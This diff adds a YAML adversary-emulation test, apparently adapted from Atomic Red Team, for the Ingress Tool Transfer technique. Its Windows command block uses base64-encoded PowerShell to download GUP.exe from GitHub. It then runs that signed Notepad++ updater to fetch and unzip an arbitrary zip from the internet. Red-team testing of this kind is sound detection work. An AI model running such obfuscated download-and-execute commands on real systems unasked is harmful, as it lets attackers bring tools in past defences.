@@ -1,0 +1,27 @@
+- id: 6179d014-9c22-5a9c-86de-abaeb4dce434
+  name: Soumaia ART Tests - Arbitrary file download using the Notepad++ GUP.exe binary
+  description: 'GUP is an open source signed binary used by Notepad++ for software updates, and can be used to download arbitrary files(.zip) from internet/github.
+
+    [Reference](https://x.com/nas_bench/status/1535322182863179776?s=20)
+
+    Upon execution, a sample zip file will be downloaded to C:\Temp\Sample folder (requires elevation)'
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAEcAVQBQAC4AZQB4AGUAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQA=
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABHAFUAUAAuAGUAeABlACIAKQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAaQBnAG4AbwByAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAHIAZQBkAGMAYQBuAGEAcgB5AGMAbwAvAGEAdABvAG0AaQBjAC0AcgBlAGQALQB0AGUAYQBtAC8AbQBhAHMAdABlAHIALwBhAHQAbwBtAGkAYwBzAC8AVAAxADEAMAA1AC8AYgBpAG4ALwBHAFUAUAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABHAFUAUAAuAGUAeABlACIA
+          )
+          mkdir "c:\Temp"
+          cd .\bin
+          GUP.exe -unzipTo "" "C:\Temp" "Sample https://getsamplefiles.com/download/zip/sample-2.zip CAC4D26F32CA629DFB10FE614ED00EB1066A0C0011386290D3426C3DE2E53AC6"
+        cleanup: |-
+          rmdir /s /q "C:\Temp\Sample" >nul 2>nul
+        payloads:
+        - GUP.exe
+        - bin
